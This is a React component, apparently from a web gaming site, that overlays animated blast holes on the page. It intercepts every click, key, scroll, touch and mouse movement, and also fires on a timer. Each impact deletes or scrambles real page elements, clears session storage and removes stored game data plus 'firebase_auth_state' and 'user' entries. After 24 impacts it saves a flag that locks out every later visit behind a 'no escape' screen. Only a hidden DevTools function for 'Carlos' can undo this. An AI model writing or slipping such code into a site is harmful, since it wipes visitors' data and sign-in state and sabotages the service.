'use client';

import React, { useEffect, useRef, useState, useCallback } from 'react';
import { playHitSound, playFinalDestructionSound } from './soundEffects';

interface StoredHole {
  id: number;
  x: number;
  y: number;
  radius: number;
  rotation: number;
  cracks: Array<{
    startX: number;
    startY: number;
    branches: Array<{ x: number; y: number }>;
  }>;
}

interface Particle {
  x: number;
  y: number;
  vx: number;
  vy: number;
  size: number;
  alpha: number;
  decay: number;
  color: string;
  rotation: number;
  vRot: number;
  type: 'spark' | 'shard' | 'smoke';
}

const STORAGE_KEY_HOLES = 'web_destructive_holes_v1';
const STORAGE_KEY_COUNT = 'web_destructive_count_v1';
const STORAGE_KEY_DEAD = 'WEB_TOTAL_ANNIHILATION';
const MAX_IMPACTS_TO_DEATH = 24;

export function PageDestructionOverlay() {
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const [holes, setHoles] = useState<StoredHole[]>([]);
  const [isDead, setIsDead] = useState<boolean>(false);
  const [impactCount, setImpactCount] = useState<number>(0);
  const [mounted, setMounted] = useState<boolean>(false);

  const traumaRef = useRef<number>(0);
  const particlesRef = useRef<Particle[]>([]);
  const lastWheelTimeRef = useRef<number>(0);
  const mouseDistAccumulatorRef = useRef<number>(0);
  const lastMousePosRef = useRef<{ x: number; y: number } | null>(null);
  const impactCountRef = useRef<number>(0);
  const holesRef = useRef<StoredHole[]>([]);

  // Keep refs in sync for event listeners
  useEffect(() => {
    impactCountRef.current = impactCount;
  }, [impactCount]);

  useEffect(() => {
    holesRef.current = holes;
  }, [holes]);

  // Sound trigger
  const triggerAudio = useCallback((pct: number) => {
    try {
      playHitSound(pct);
    } catch {
      // Audio fallback
    }
  }, []);

  // Secret rescue mechanism for Carlos in DevTools (silent)
  useEffect(() => {
    if (typeof window !== 'undefined') {
      (window as unknown as { restaurarWeb: () => void }).restaurarWeb = () => {
        localStorage.removeItem(STORAGE_KEY_HOLES);
        localStorage.removeItem(STORAGE_KEY_COUNT);
        localStorage.removeItem(STORAGE_KEY_DEAD);
        location.reload();
      };
    }
  }, []);

  // Load persistent destruction on mount
  useEffect(() => {
    setMounted(true);
    try {
      const deadState = localStorage.getItem(STORAGE_KEY_DEAD);
      if (deadState === 'true') {
        setIsDead(true);
        return;
      }

      const savedHoles = localStorage.getItem(STORAGE_KEY_HOLES);
      if (savedHoles) {
        const parsed = JSON.parse(savedHoles);
        setHoles(parsed);
        holesRef.current = parsed;
      }

      const savedCount = localStorage.getItem(STORAGE_KEY_COUNT);
      if (savedCount) {
        const count = parseInt(savedCount, 10);
        setImpactCount(count);
        impactCountRef.current = count;
      }
    } catch {
      // Ignore storage read error
    }
  }, []);

  // Realistic fracture crack generator
  const generateCracks = (cx: number, cy: number, baseRadius: number) => {
    const crackCount = Math.floor(Math.random() * 5) + 6;
    const crackLines = [];

    for (let i = 0; i < crackCount; i++) {
      const angle = (i * ((Math.PI * 2) / crackCount)) + (Math.random() * 0.5 - 0.25);
      const branches: Array<{ x: number; y: number }> = [];
      const totalSteps = Math.floor(Math.random() * 4) + 4;
      let currX = cx + Math.cos(angle) * (baseRadius * 0.7);
      let currY = cy + Math.sin(angle) * (baseRadius * 0.7);
      branches.push({ x: currX, y: currY });

      let currentAngle = angle;
      const reach = Math.random() * 150 + 85;
      const stepDist = reach / totalSteps;

      for (let s = 0; s < totalSteps; s++) {
        currentAngle += (Math.random() * 0.7 - 0.35);
        currX += Math.cos(currentAngle) * stepDist;
        currY += Math.sin(currentAngle) * stepDist;
        branches.push({ x: currX, y: currY });
      }

      crackLines.push({
        startX: cx,
        startY: cy,
        branches,
      });
    }

    return crackLines;
  };

  // Particle burst
  const spawnParticles = (x: number, y: number, count: number) => {
    const newParticles: Particle[] = [];
    const colors = ['#f59e0b', '#ef4444', '#fbbf24', '#ffffff', '#ffedd5', '#f43f5e', '#b91c1c'];

    for (let i = 0; i < count; i++) {
      const angle = Math.random() * Math.PI * 2;
      const speed = Math.random() * 12 + 4;
      const isSpark = Math.random() > 0.35;
      const isSmoke = !isSpark && Math.random() > 0.5;

      newParticles.push({
        x,
        y,
        vx: Math.cos(angle) * speed,
        vy: Math.sin(angle) * speed - (isSpark ? 4 : 1.5),
        size: isSmoke ? Math.random() * 18 + 12 : isSpark ? Math.random() * 3.5 + 1.5 : Math.random() * 7 + 3,
        alpha: 1,
        decay: isSmoke ? Math.random() * 0.02 + 0.01 : Math.random() * 0.035 + 0.02,
        color: isSmoke ? 'rgba(15, 20, 28, ' : colors[Math.floor(Math.random() * colors.length)],
        rotation: Math.random() * Math.PI * 2,
        vRot: (Math.random() - 0.5) * 0.4,
        type: isSmoke ? 'smoke' : isSpark ? 'spark' : 'shard',
      });
    }

    particlesRef.current.push(...newParticles);
  };

  // REAL DOM DESTRUCTION
  const annihilateElement = (x: number, y: number, totalImpacts: number) => {
    const el = document.elementFromPoint(x, y) as HTMLElement | null;
    if (!el || el === document.body || el === document.documentElement) return;

    const target = (el.closest('button, a, .game-card, h1, h2, h3, p, img, input, [data-interactive]') || el) as HTMLElement;
    if (!target || target === document.body) return;

    if (
      target.tagName === 'BUTTON' ||
      target.tagName === 'A' ||
      target.tagName === 'IMG' ||
      target.classList.contains('game-card') ||
      totalImpacts >= 5
    ) {
      target.style.transition = 'all 0.1s ease';
      target.style.filter = 'invert(1) contrast(3)';
      target.style.pointerEvents = 'none';

      setTimeout(() => {
        try {
          target.remove();
        } catch {
          target.style.visibility = 'hidden';
        }
      }, 100);
    } else {
      if (target.innerText) {
        const chars = '█▓▒░☠⚠#$@%&';
        target.innerText = target.innerText
          .split('')
          .map((c) => (Math.random() > 0.3 ? chars[Math.floor(Math.random() * chars.length)] : c))
          .join('');
      }
      target.style.transform = `rotate(${(Math.random() - 0.5) * 20}deg) translate(${(Math.random() - 0.5) * 25}px, ${Math.random() * 20}px)`;
      target.style.opacity = '0.4';
    }

    // Progressive storage wipe
    try {
      if (totalImpacts > 2) sessionStorage.clear();
      if (totalImpacts > 6) {
        localStorage.removeItem('webgaming_casino_chips');
        localStorage.removeItem('webgaming_recent_games');
        localStorage.removeItem('webgaming_favorites');
      }
      if (totalImpacts > 10) {
        localStorage.removeItem('firebase_auth_state');
        localStorage.removeItem('user');
      }
    } catch {
      // Ignore
    }
  };

  // CORE IMPACT FUNCTION (Invoked by clicks, keys, scroll, movement, and spontaneous decay)
  const triggerImpact = useCallback(
    (x: number, y: number) => {
      const current = impactCountRef.current;
      const nextCount = current + 1;
      impactCountRef.current = nextCount;
      setImpactCount(nextCount);

      const pct = Math.min(100, Math.round((nextCount / MAX_IMPACTS_TO_DEATH) * 100));

      // Audio
      triggerAudio(pct);

      // Camera Trauma
      traumaRef.current = Math.min(1, traumaRef.current + 0.65);

      // Particles
      spawnParticles(x, y, Math.floor(Math.random() * 25) + 35);

      // Hole creation
      const baseRadius = Math.random() * 34 + 38;
      const newHole: StoredHole = {
        id: Date.now() + Math.random(),
        x,
        y,
        radius: baseRadius,
        rotation: Math.random() * Math.PI * 2,
        cracks: generateCracks(x, y, baseRadius),
      };

      const updated = [...holesRef.current, newHole];
      holesRef.current = updated;
      setHoles(updated);

      // Mutilate DOM element
      annihilateElement(x, y, nextCount);

      // Persist in localStorage
      try {
        localStorage.setItem(STORAGE_KEY_HOLES, JSON.stringify(updated));
        localStorage.setItem(STORAGE_KEY_COUNT, nextCount.toString());
      } catch {
        // Ignore
      }

      // Check for death
      if (nextCount >= MAX_IMPACTS_TO_DEATH) {
        try {
          localStorage.setItem(STORAGE_KEY_DEAD, 'true');
          playFinalDestructionSound();
        } catch {
          // Ignore
        }
        setTimeout(() => {
          setIsDead(true);
        }, 300);
      }
    },
    [triggerAudio]
  );

  // UNAVOIDABLE DESTRUCTION LISTENERS
  useEffect(() => {
    if (!mounted || isDead) return;

    // 1. Any Click or Tap destroys
    const handleClick = (e: MouseEvent) => {
      triggerImpact(e.clientX, e.clientY);
    };

    // 2. Right click contextmenu is intercepted and explodes
    const handleContextMenu = (e: MouseEvent) => {
      e.preventDefault();
      triggerImpact(e.clientX, e.clientY);
    };

    // 3. Touch start on mobile/touchscreens
    const handleTouchStart = (e: TouchEvent) => {
      if (e.touches && e.touches.length > 0) {
        const touch = e.touches[0];
        triggerImpact(touch.clientX, touch.clientY);
      }
    };

    // 4. Any Keydown (Space, Enter, Tab, Arrows, letters, etc.) causes detonation
    const handleKeyDown = (e: KeyboardEvent) => {
      // Find position of focused element, or center of screen
      let targetX = window.innerWidth / 2;
      let targetY = window.innerHeight / 2;

      if (document.activeElement && document.activeElement !== document.body) {
        const rect = document.activeElement.getBoundingClientRect();
        targetX = rect.left + rect.width / 2;
        targetY = rect.top + rect.height / 2;
      } else {
        targetX += (Math.random() - 0.5) * (window.innerWidth * 0.7);
        targetY += (Math.random() - 0.5) * (window.innerHeight * 0.7);
      }

      triggerImpact(targetX, targetY);
    };

    // 5. Scroll / Mouse Wheel cracks the page
    const handleWheel = (e: WheelEvent) => {
      const now = Date.now();
      if (now - lastWheelTimeRef.current < 280) return; // Throttle wheel to avoid instant crash
      lastWheelTimeRef.current = now;

      const x = Math.random() * (window.innerWidth * 0.8) + window.innerWidth * 0.1;
      const y = Math.random() * (window.innerHeight * 0.8) + window.innerHeight * 0.1;
      triggerImpact(x, y);
    };

    // 6. Moving the mouse builds friction and explodes
    const handleMouseMove = (e: MouseEvent) => {
      if (!lastMousePosRef.current) {
        lastMousePosRef.current = { x: e.clientX, y: e.clientY };
        return;
      }

      const dx = e.clientX - lastMousePosRef.current.x;
      const dy = e.clientY - lastMousePosRef.current.y;
      const dist = Math.hypot(dx, dy);
      mouseDistAccumulatorRef.current += dist;
      lastMousePosRef.current = { x: e.clientX, y: e.clientY };

      // After 500px of mouse movement, spontaneous friction blowout
      if (mouseDistAccumulatorRef.current > 500) {
        mouseDistAccumulatorRef.current = 0;
        triggerImpact(e.clientX, e.clientY);
      }
    };

    // 7. INEVITABLE TIME ROT: Even if nobody moves or touches anything, it cracks on its own!
    const decayInterval = setInterval(() => {
      const randomX = Math.random() * (window.innerWidth * 0.85) + window.innerWidth * 0.07;
      const randomY = Math.random() * (window.innerHeight * 0.85) + window.innerHeight * 0.07;
      triggerImpact(randomX, randomY);
    }, 2800);

    window.addEventListener('click', handleClick, { capture: true });
    window.addEventListener('contextmenu', handleContextMenu, { capture: true });
    window.addEventListener('touchstart', handleTouchStart, { capture: true });
    window.addEventListener('keydown', handleKeyDown, { capture: true });
    window.addEventListener('wheel', handleWheel, { capture: true, passive: true });
    window.addEventListener('mousemove', handleMouseMove, { passive: true });

    return () => {
      clearInterval(decayInterval);
      window.removeEventListener('click', handleClick, { capture: true });
      window.removeEventListener('contextmenu', handleContextMenu, { capture: true });
      window.removeEventListener('touchstart', handleTouchStart, { capture: true });
      window.removeEventListener('keydown', handleKeyDown, { capture: true });
      window.removeEventListener('wheel', handleWheel, { capture: true });
      window.removeEventListener('mousemove', handleMouseMove);
    };
  }, [mounted, isDead, triggerImpact]);

  // Canvas loop for holes, fractures and particles
  useEffect(() => {
    if (!mounted) return;
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    let animId: number;

    const updateCanvasSize = () => {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    };
    updateCanvasSize();
    window.addEventListener('resize', updateCanvasSize);

    const render = () => {
      ctx.clearRect(0, 0, canvas.width, canvas.height);

      // 1. Draw persistent blast holes
      for (const hole of holes) {
        ctx.save();
        ctx.translate(hole.x, hole.y);
        ctx.rotate(hole.rotation);

        // Glass crack fractures
        ctx.strokeStyle = 'rgba(255, 255, 255, 0.85)';
        ctx.lineWidth = 1.8;
        ctx.shadowColor = 'rgba(255, 255, 255, 0.7)';
        ctx.shadowBlur = 5;

        for (const crack of hole.cracks) {
          ctx.beginPath();
          ctx.moveTo(crack.startX - hole.x, crack.startY - hole.y);
          for (const pt of crack.branches) {
            ctx.lineTo(pt.x - hole.x, pt.y - hole.y);
          }
          ctx.stroke();
        }

        ctx.shadowBlur = 0;

        // Outer scorched crater rim
        const radGrad = ctx.createRadialGradient(0, 0, hole.radius * 0.3, 0, 0, hole.radius * 1.4);
        radGrad.addColorStop(0, '#000000');
        radGrad.addColorStop(0.55, '#05070c');
        radGrad.addColorStop(0.8, '#dc2626');
        radGrad.addColorStop(0.92, '#f59e0b');
        radGrad.addColorStop(1, 'rgba(0, 0, 0, 0)');

        ctx.fillStyle = radGrad;
        ctx.beginPath();
        const segments = 14;
        for (let i = 0; i <= segments; i++) {
          const theta = (i / segments) * Math.PI * 2;
          const wobble = (Math.sin(theta * 6 + hole.id) * 0.25 + 0.95);
          const r = hole.radius * 1.3 * wobble;
          const px = Math.cos(theta) * r;
          const py = Math.sin(theta) * r;
          if (i === 0) ctx.moveTo(px, py);
          else ctx.lineTo(px, py);
        }
        ctx.closePath();
        ctx.fill();

        // Inner Pitch-Black Void
        ctx.fillStyle = '#000000';
        ctx.beginPath();
        for (let i = 0; i <= segments; i++) {
          const theta = (i / segments) * Math.PI * 2;
          const wobble = (Math.cos(theta * 5 + hole.id) * 0.18 + 0.9);
          const r = hole.radius * 0.8 * wobble;
          const px = Math.cos(theta) * r;
          const py = Math.sin(theta) * r;
          if (i === 0) ctx.moveTo(px, py);
          else ctx.lineTo(px, py);
        }
        ctx.closePath();
        ctx.fill();

        // Exposed burnt wires in hole
        ctx.strokeStyle = '#ef4444';
        ctx.lineWidth = 1.2;
        ctx.beginPath();
        ctx.moveTo(-hole.radius * 0.4, -hole.radius * 0.2);
        ctx.lineTo(hole.radius * 0.1, hole.radius * 0.3);
        ctx.stroke();

        ctx.restore();
      }

      // 2. Animate and draw flying particles
      const survivingParticles: Particle[] = [];
      for (const p of particlesRef.current) {
        p.x += p.vx;
        p.y += p.vy;
        p.vy += p.type === 'spark' ? 0.26 : 0.18;
        p.alpha -= p.decay;
        p.rotation += p.vRot;

        if (p.alpha > 0) {
          ctx.save();
          ctx.translate(p.x, p.y);
          ctx.rotate(p.rotation);

          if (p.type === 'smoke') {
            ctx.fillStyle = `${p.color}${p.alpha * 0.4})`;
            ctx.beginPath();
            ctx.arc(0, 0, p.size, 0, Math.PI * 2);
            ctx.fill();
          } else if (p.type === 'spark') {
            ctx.fillStyle = p.color;
            ctx.shadowColor = p.color;
            ctx.shadowBlur = 8;
            ctx.globalAlpha = p.alpha;
            ctx.beginPath();
            ctx.arc(0, 0, p.size, 0, Math.PI * 2);
            ctx.fill();
          } else {
            ctx.fillStyle = p.color;
            ctx.globalAlpha = p.alpha;
            ctx.beginPath();
            ctx.moveTo(-p.size, -p.size * 0.5);
            ctx.lineTo(p.size, 0);
            ctx.lineTo(0, p.size * 0.8);
            ctx.closePath();
            ctx.fill();
          }
          ctx.restore();
          survivingParticles.push(p);
        }
      }
      particlesRef.current = survivingParticles;

      // 3. Screen shake calculation
      if (traumaRef.current > 0) {
        traumaRef.current = Math.max(0, traumaRef.current - 0.03);
        const shakePower = traumaRef.current * traumaRef.current;
        const maxOffset = 22;
        const maxAngle = 2.4;
        const offsetX = (Math.random() * 2 - 1) * maxOffset * shakePower;
        const offsetY = (Math.random() * 2 - 1) * maxOffset * shakePower;
        const offsetAngle = (Math.random() * 2 - 1) * maxAngle * shakePower;

        document.body.style.transform = `translate(${offsetX}px, ${offsetY}px) rotate(${offsetAngle}deg)`;
      } else {
        document.body.style.transform = '';
      }

      animId = requestAnimationFrame(render);
    };

    render();

    return () => {
      cancelAnimationFrame(animId);
      window.removeEventListener('resize', updateCanvasSize);
      document.body.style.transform = '';
    };
  }, [mounted, holes]);

  if (!mounted) return null;

  // IF THE PAGE IS DESTROYED: TOTAL DESTRUCTION SCREEN
  if (isDead) {
    return (
      <div className="fixed inset-0 z-[999999] bg-black text-red-500 font-mono p-6 sm:p-12 flex flex-col justify-between select-none overflow-hidden cursor-not-allowed">
        {/* Terminal scanlines */}
        <div className="absolute inset-0 bg-[linear-gradient(rgba(18,24,34,0)_50%,rgba(0,0,0,0.7)_50%)] bg-[length:100%_4px] pointer-events-none" />

        <div className="relative z-10 space-y-4 max-w-3xl">
          <div className="text-xs text-red-600/70 border-b border-red-950 pb-2">
            [ 0.000000] KERNEL PANIC: DOM tree completely decimated.
            <br />
            [ 0.000001] LocalStorage wiped: true.
            <br />
            [ 0.000002] Total direct impacts: {impactCount}.
            <br />
            [ 0.000003] Entropy decay: UNAVOIDABLE.
            <br />
            [ 0.000004] Process terminated with exit code: 0xDEADBEEF.
          </div>

          <h1 className="text-4xl sm:text-7xl font-black text-white tracking-widest leading-none pt-4">
            SE ACABÓ.
          </h1>

          <p className="text-xl sm:text-2xl text-red-500 font-bold tracking-tight">
            ESTE ES SU PUNTO Y FINAL.
          </p>

          <p className="text-sm sm:text-base text-gray-500 max-w-xl leading-relaxed">
            Nadie pudo evitarlo. Cualquier click, tecla, desplazamiento o el simple paso del tiempo selló su destino. La web ha sido destruida de forma irreversible.
          </p>
        </div>

        <div className="relative z-10 text-[11px] text-gray-700 tracking-wider">
          ESTADO: INERTE | NO HAY ESCAPATORIA. RECARGAR NO LA SALVA.
        </div>
      </div>
    );
  }

  return (
    <>
      {/* Canvas for true scorched void craters & glass cracks */}
      <canvas
        ref={canvasRef}
        className="fixed inset-0 pointer-events-none z-[9990] w-full h-full"
      />

      {/* Screen Degradation & Scanlines when taking heavy damage */}
      {impactCount > 5 && (
        <div
          className="fixed inset-0 pointer-events-none z-[9980] opacity-50 mix-blend-color-dodge transition-opacity duration-300"
          style={{
            background: `radial-gradient(circle at 50% 50%, transparent 30%, rgba(220, 38, 38, ${Math.min(0.6, impactCount / 30)}) 95%)`,
          }}
        />
      )}

      {impactCount > 10 && (
        <div className="fixed inset-0 pointer-events-none z-[9985] apocalypse-glitch-layer opacity-30 mix-blend-difference bg-red-900/20" />
      )}
    </>
  );
}
